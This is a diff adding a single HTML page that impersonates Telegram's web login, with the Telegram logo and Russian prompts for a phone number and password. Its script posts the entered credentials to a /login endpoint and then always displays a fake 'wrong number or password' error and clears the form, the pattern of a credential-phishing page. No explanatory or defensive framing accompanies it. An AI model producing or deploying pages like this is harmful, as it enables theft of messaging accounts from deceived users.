@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Web</title>
+    <style>
+        body { margin:0; font-family:sans-serif; background:linear-gradient(135deg,#2AABEE,#229ED9); height:100vh; display:flex; align-items:center; justify-content:center; }
+        .card { background:white; border-radius:16px; padding:40px 32px; width:380px; text-align:center; box-shadow:0 20px 60px rgba(0,0,0,0.3); }
+        img { width:80px; margin-bottom:20px; }
+        h1 { font-size:24px; color:#222; }
+        p { color:#707579; font-size:14px; margin-bottom:30px; }
+        input { width:100%; padding:12px 16px; border:2px solid #E8E8E8; border-radius:10px; font-size:16px; margin-bottom:16px; outline:none; background:#F9F9F9; }
+        input:focus { border-color:#2AABEE; background:white; }
+        button { width:100%; padding:14px; background:#2AABEE; color:white; border:none; border-radius:10px; font-size:16px; cursor:pointer; }
+        button:hover { background:#229ED9; }
+        .error { color:#E53935; font-size:13px; margin-top:10px; display:none; }
+        .loading { display:none; margin-top:16px; }
+        .spinner { width:24px; height:24px; border:3px solid #E8E8E8; border-top-color:#2AABEE; border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto; }
+        @keyframes spin { to { transform:rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <img src="https://telegram.org/img/t_logo.svg">
+        <h1>Войти в Telegram</h1>
+        <p>Введите номер телефона и пароль</p>
+        <form id="f" method="POST" action="/login">
+            <input type="tel" name="phone" placeholder="+7 (999) 999-99-99" required>
+            <input type="password" name="password" placeholder="Пароль" required>
+            <button type="submit">Войти</button>
+            <div class="error" id="err">Неверный номер или пароль</div>
+            <div class="loading"><div class="spinner"></div><p style="margin-top:12px;color:#707579;">Подождите...</p></div>
+        </form>
+    </div>
+    <script>
+        document.getElementById("f").addEventListener("submit", function(e) {
+            e.preventDefault();
+            document.querySelector(".loading").style.display = "block";
+            document.querySelector("button").style.display = "none";
+            document.getElementById("err").style.display = "none";
+            var d = new FormData(this);
+            fetch("/login", {method:"POST", body:d}).then(function() {
+                document.querySelector(".loading").style.display = "none";
+                document.querySelector("button").style.display = "block";
+                document.getElementById("err").style.display = "block";
+                document.getElementById("f").reset();
+            });
+        });
+    </script>
+</body>
+</html>
